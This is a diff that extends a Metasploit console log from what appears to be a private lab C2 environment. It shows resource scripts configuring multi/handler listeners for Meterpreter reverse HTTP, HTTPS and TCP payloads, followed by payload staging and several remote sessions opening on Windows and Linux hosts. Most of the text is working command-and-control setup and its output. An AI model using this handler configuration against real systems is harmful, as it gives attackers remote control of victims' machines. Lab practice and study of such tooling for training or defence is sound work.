@@ -1525,4 +1525,226 @@ Active sessions
 2026-02-11 12:49:49 >  exploit([1m[31mmulti/handler[0m) [0m> [0m[1m[34m[*][0m Meterpreter session 2 opened (192.168.56.10:8080 -> 192.168.56.30:49941) at 2026-02-11 12:49:55 -0500
 [1m[34m[*][0m Meterpreter session 3 opened (192.168.56.10:8080 -> 192.168.56.30:49949) at 2026-02-11 12:50:19 -0500
 [0m[1m[34m[*][0m You have active sessions open, to exit anyway type "exit -y"
-2026-02-11 13:07:47 >  exploit([1m[31mmulti/handler[0m) [0m> 
+2026-02-11 13:07:47 >  exploit([1m[31mmulti/handler[0m) [0m> [1m[34m[*][0m Spooling to file /home/kali/Desktop/c2/msf-c2/console.log...
+resource (/home/kali/Desktop/c2/msf-c2/enable_logging.rc)> setg SessionLogging true
+[0mSession logging enabled.
+SessionLogging => true
+resource (/home/kali/Desktop/c2/msf-c2/enable_logging.rc)> setg SessionTranscript true
+[0mSessionTranscript => true
+resource (/home/kali/Desktop/c2/msf-c2/enable_logging.rc)> setg PromptTimeFormat "%Y-%m-%d %H:%M:%S"
+[0mPromptTimeFormat => %Y-%m-%d %H:%M:%S
+resource (/home/kali/Desktop/c2/msf-c2/enable_logging.rc)> setg Prompt "%T > "
+[0mPrompt => %T > 
+resource (/home/kali/Desktop/c2/msf-c2/enable_logging.rc)> print_status "Logging enabled. Output saved to console.log and ~/.msf4/logs/"
+[0m[1m[31m[-][0m Unknown command: print_status. Run the [32mhelp[0m command for more details.
+[1m[34m[*][0m Processing /home/kali/Desktop/c2/msf-c2/advanced_handler.rc for ERB directives.
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> use multi/handler
+[0m[1m[34m[*][0m Using configured payload generic/shell_reverse_tcp
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> unset PAYLOAD
+[0mUnsetting PAYLOAD...
+[1m[33m[!][0m Variable "PAYLOAD" unset - but will use a default value still. If this is not desired, set it to a new value or attempt to clear it with [32mset --clear PAYLOAD[0m
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> unset LPORT
+[0mUnsetting LPORT...
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> unset LHOST
+[0mUnsetting LHOST...
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set PAYLOAD windows/meterpreter/reverse_http
+[0mPAYLOAD => windows/meterpreter/reverse_http
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set LPORT 8080
+[0mLPORT => 8080
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set LHOST 192.168.56.10
+[0mLHOST => 192.168.56.10
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set ExitOnSession false
+[0mExitOnSession => false
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set SessionCommunicationTimeout 10
+[0mSessionCommunicationTimeout => 10
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set SessionExpirationTimeout 3600
+[0mSessionExpirationTimeout => 3600
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> exploit -j -z
+[0m[1m[34m[*][0m Exploit running as background job 0.
+[1m[34m[*][0m Exploit completed, but no session was created.
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> use multi/handler
+[0m[1m[34m[*][0m Using configured payload windows/meterpreter/reverse_http
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> unset PAYLOAD
+[0m[1m[34m[*][0m Started HTTP reverse handler on http://192.168.56.10:8080
+Unsetting PAYLOAD...
+[1m[33m[!][0m Variable "PAYLOAD" unset - but will use a default value still. If this is not desired, set it to a new value or attempt to clear it with [32mset --clear PAYLOAD[0m
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> unset LPORT
+[0mUnsetting LPORT...
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> unset LHOST
+[0mUnsetting LHOST...
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set PAYLOAD windows/meterpreter/reverse_https
+[0mPAYLOAD => windows/meterpreter/reverse_https
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set LPORT 8443
+[0mLPORT => 8443
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set LHOST 192.168.56.10
+[0mLHOST => 192.168.56.10
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set ExitOnSession false
+[0mExitOnSession => false
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set SessionCommunicationTimeout 10
+[0mSessionCommunicationTimeout => 10
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set SessionExpirationTimeout 3600
+[0mSessionExpirationTimeout => 3600
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> exploit -j -z
+[0m[1m[34m[*][0m Exploit running as background job 1.
+[1m[34m[*][0m Exploit completed, but no session was created.
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> use multi/handler
+[0m[1m[34m[*][0m Using configured payload windows/meterpreter/reverse_https
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> unset PAYLOAD
+[0mUnsetting PAYLOAD...
+[1m[33m[!][0m Variable "PAYLOAD" unset - but will use a default value still. If this is not desired, set it to a new value or attempt to clear it with [32mset --clear PAYLOAD[0m
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> unset LPORT
+[0mUnsetting LPORT...
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> unset LHOST
+[0mUnsetting LHOST...
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set PAYLOAD linux/x64/meterpreter/reverse_tcp
+[0mPAYLOAD => linux/x64/meterpreter/reverse_tcp
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set LPORT 4444
+[0mLPORT => 4444
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set LHOST 192.168.56.10
+[0mLHOST => 192.168.56.10
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set ExitOnSession false
+[0mExitOnSession => false
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> exploit -j -z
+[0m[1m[34m[*][0m Exploit running as background job 2.
+[1m[34m[*][0m Exploit completed, but no session was created.
+[1m[34m[*][0m Started reverse TCP handler on 192.168.56.10:4444 
+[?1034h2026-02-12 09:20:17 >  exploit([1m[31mmulti/handler[0m) [0m> 
+[1m[34m[*][0m Started HTTPS reverse handler on https://192.168.56.10:8443
+jobs
+[0m
+Jobs
+====
+
+  Id  Name                    Payload                          Payload opts
+  --  ----                    -------                          ------------
+  0   Exploit: multi/handler  windows/meterpreter/reverse_htt  http://192.168.56.10:8080
+                              p
+  1   Exploit: multi/handler  windows/meterpreter/reverse_htt  https://192.168.56.10:8443
+                              ps
+  2   Exploit: multi/handler  linux/x64/meterpreter/reverse_t  tcp://192.168.56.10:4444
+                              cp
+
+2026-02-12 09:20:32 >  exploit([1m[31mmulti/handler[0m) [0m> sessions
+[0m
+Active sessions
+===============
+
+No active sessions.
+
+2026-02-12 09:20:35 >  exploit([1m[31mmulti/handler[0m) [0m> sessions
+[1m[33m[!][0m http://192.168.56.10:8080 handling request from 192.168.56.30; (UUID: ai20stnl) Without a database connected that payload UUID tracking will not work!
+[1m[34m[*][0m http://192.168.56.10:8080 handling request from 192.168.56.30; (UUID: ai20stnl) Staging x86 payload (178780 bytes) ...
+
+[0m
+Active sessions
+===============
+
+No active sessions.
+
+2026-02-12 09:21:48 >  exploit([1m[31mmulti/handler[0m) [0m> sessions
+[0m
+Active sessions
+===============
+
+No active sessions.
+
+2026-02-12 09:21:49 >  exploit([1m[31mmulti/handler[0m) [0m> 
+[1m[33m[!][0m http://192.168.56.10:8080 handling request from 192.168.56.30; (UUID: ai20stnl) Without a database connected that payload UUID tracking will not work!
+[0m[1m[33m[!][0m http://192.168.56.10:8080 handling request from 192.168.56.30; (UUID: ai20stnl) Without a database connected that payload UUID tracking will not work!
+[1m[34m[*][0m http://192.168.56.10:8080 handling request from 192.168.56.30; (UUID: ai20stnl) Staging x86 payload (178780 bytes) ...
+sessions
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                     Information  Connection
+  --  ----  ----                     -----------  ----------
+  1         meterpreter x86/windows               192.168.56.10:8080 -> 192.168.56.30:499
+                                                  06 (192.168.56.30)
+
+2026-02-12 09:22:24 >  exploit([1m[31mmulti/handler[0m) [0m> 
+[1m[33m[!][0m http://192.168.56.10:8080 handling request from 192.168.56.30; (UUID: ai20stnl) Without a database connected that payload UUID tracking will not work!
+[0m[0msessions
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                     Information  Connection
+  --  ----  ----                     -----------  ----------
+  1         meterpreter x86/windows               192.168.56.10:8080 -> 192.168.56.30:499
+                                                  06 (192.168.56.30)
+  2         meterpreter x86/windows               192.168.56.10:8080 -> 192.168.56.30:499
+                                                  10 (192.168.56.30)
+
+2026-02-12 09:22:32 >  exploit([1m[31mmulti/handler[0m) [0m> [0m[1m[34m[*][0m Meterpreter session 1 opened (192.168.56.10:8080 -> 192.168.56.30:49906) at 2026-02-12 09:22:56 -0500
+[1m[34m[*][0m Meterpreter session 2 opened (192.168.56.10:8080 -> 192.168.56.30:49910) at 2026-02-12 09:23:08 -0500
+sessions
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                     Information                Connection
+  --  ----  ----                     -----------                ----------
+  1         meterpreter x86/windows  DESKTOP-R4HDGVJ\deku @ DE  192.168.56.10:8080 -> 192
+                                     SKTOP-R4HDGVJ              .168.56.30:49906 (192.168
+                                                                .56.30)
+  2         meterpreter x86/windows  DESKTOP-R4HDGVJ\deku @ DE  192.168.56.10:8080 -> 192
+                                     SKTOP-R4HDGVJ              .168.56.30:49910 (192.168
+                                                                .56.30)
+
+2026-02-12 09:23:38 >  exploit([1m[31mmulti/handler[0m) [0m> 
+[1m[34m[*][0m Sending stage (3090404 bytes) to 192.168.56.15
+[0m[1m[34m[*][0m Meterpreter session 3 opened (192.168.56.10:4444 -> 192.168.56.15:54304) at 2026-02-12 09:25:28 -0500
+sessions
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                     Information                Connection
+  --  ----  ----                     -----------                ----------
+  1         meterpreter x86/windows  DESKTOP-R4HDGVJ\deku @ DE  192.168.56.10:8080 -> 192
+                                     SKTOP-R4HDGVJ              .168.56.30:49906 (192.168
+                                                                .56.30)
+  2         meterpreter x86/windows  DESKTOP-R4HDGVJ\deku @ DE  192.168.56.10:8080 -> 192
+                                     SKTOP-R4HDGVJ              .168.56.30:49910 (192.168
+                                                                .56.30)
+  3         meterpreter x64/linux    mx @ 10.0.2.15             192.168.56.10:4444 -> 192
+                                                                .168.56.15:54304 (192.168
+                                                                .56.15)
+
+2026-02-12 09:27:35 >  exploit([1m[31mmulti/handler[0m) [0m> sessions
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                     Information                Connection
+  --  ----  ----                     -----------                ----------
+  1         meterpreter x86/windows  DESKTOP-R4HDGVJ\deku @ DE  192.168.56.10:8080 -> 192
+                                     SKTOP-R4HDGVJ              .168.56.30:49906 (192.168
+                                                                .56.30)
+  2         meterpreter x86/windows  DESKTOP-R4HDGVJ\deku @ DE  192.168.56.10:8080 -> 192
+                                     SKTOP-R4HDGVJ              .168.56.30:49910 (192.168
+                                                                .56.30)
+  3         meterpreter x64/linux    mx @ 10.0.2.15             192.168.56.10:4444 -> 192
+                                                                .168.56.15:54304 (192.168
+                                                                .56.15)
+
+2026-02-12 09:36:42 >  exploit([1m[31mmulti/handler[0m) [0m> sessions
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                     Information                Connection
+  --  ----  ----                     -----------                ----------
+  1         meterpreter x86/windows  DESKTOP-R4HDGVJ\deku @ DE  192.168.56.10:8080 -> 192
+                                     SKTOP-R4HDGVJ              .168.56.30:49906 (192.168
+                                                                .56.30)
+  2         meterpreter x86/windows  DESKTOP-R4HDGVJ\deku @ DE  192.168.56.10:8080 -> 192
+                                     SKTOP-R4HDGVJ              .168.56.30:49910 (192.168
+                                                                .56.30)
+  3         meterpreter x64/linux    mx @ 10.0.2.15             192.168.56.10:4444 -> 192
+                                                                .168.56.15:54304 (192.168
+                                                                .56.15)
+
+2026-02-12 09:54:30 >  exploit([1m[31mmulti/handler[0m) [0m> [0m[1m[34m[*][0m You have active sessions open, to exit anyway type "exit -y"
+2026-02-12 10:14:06 >  exploit([1m[31mmulti/handler[0m) [0m> 
